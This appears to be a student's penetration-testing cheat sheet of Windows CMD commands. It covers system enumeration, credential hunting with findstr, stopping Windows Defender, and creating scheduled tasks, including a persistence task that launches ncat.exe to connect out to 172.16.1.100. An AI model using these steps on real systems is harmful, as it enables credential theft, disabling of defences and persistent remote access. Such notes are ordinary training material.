# Windows CMD Reference

## File commands CMD

```cmd
# Basic system info
whoami
whoami /priv        # privileges
whoami /groups      # groups
systeminfo          # OS and patch details
hostname
ver                 # Windows version

ipconfig /all       # full network configuration
arp -a              # ARP cache

# Network and sharing
net localgroup      # show local groups
net share           # shared folders
net view            # list servers in the domain/workgroup

# Active processes and services
tasklist
tasklist /svc       # show associated services
```

## Enumeration

```cmd
# Basic system info
whoami
whoami /priv        # privileges
whoami /groups      # groups
systeminfo          # OS and patch details
hostname
ver                 # Windows version

ipconfig /all       # full network configuration
arp -a              # ARP cache

# Network and sharing
net localgroup      # show local groups
net share           # shared folders
net view            # list servers in the domain/workgroup

# Active processes and services
tasklist
tasklist /svc       # show associated services
```

## Finding files

[findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) - cheatsheet

```cmd
# Locate files
where /R
where /R C:\Users\student\ *.csv

find "password" "C:\Users\student\not-passwords.txt" 

# General find files
dir n:\*cred* /s /b
n:\Contracts\private\credentials.txt

# Grep like
findstr /s /i cred n:\*.*
n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!

# find compare
fc passwords.txt modded.txt /N
comp .\file-1.md .\file-2.md
```

## Env Variable

```cmd
echo %WINDIR%
set SECRET=HTB{5UP3r_53Cr37_V4r14813}
echo %SECRET%

# Registry locations (for reference)
# System-wide
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
# User-specific
HKEY_CURRENT_USER\Environment
```

## Services handling

```cmd
# Query services
sc query type= service
sc query windefend
sc stop windefend

tasklist /svc
net start
wmic service list brief

# Disable a service
sc config bits start= disabled
```

## Scheduled tasks

#### Query Syntax

```cmd
# View scheduled tasks (verbose, list output)
schtasks /Query /V /FO LIST

# Create a task that runs at system startup (persistence example)
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

/create : to tell it what we are doing
/sc : we must set a schedule
/tn : we must set the name
/tr : we must give it an action to take

# Modify an existing task (change run user / password)
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

/tn 	Designates the task to change
/tr 	Modifies the program or action that the task runs.
/ENABLE 	Change the state of the task to Enabled.
/DISABLE 	Change the state of the task to Disabled.

# Query a specific task (verbose)
schtasks /query /tn "My Secret Task" /V /fo list

# Delete a task
schtasks /delete /tn "My Secret Task" /f
```

## Quick Notes

- `systeminfo` often reveals missing hotfixes and patch-level details useful for exploitation/privesc checks.
- `findstr /s /i` and `where /R` are invaluable for credential hunting (`password`, `secret`, `key`, `token`, `cred`).
- Check both user and system environment vars and registry-backed env entries for secrets or persistence.
- Services: watch for unquoted service paths, weak ACLs, or services running as SYSTEM.
- Scheduled tasks are a common persistence vector; always enumerate with verbose output.
- Use `tasklist /svc` and `wmic service list brief` to map processes to services and investigate privilege contexts.

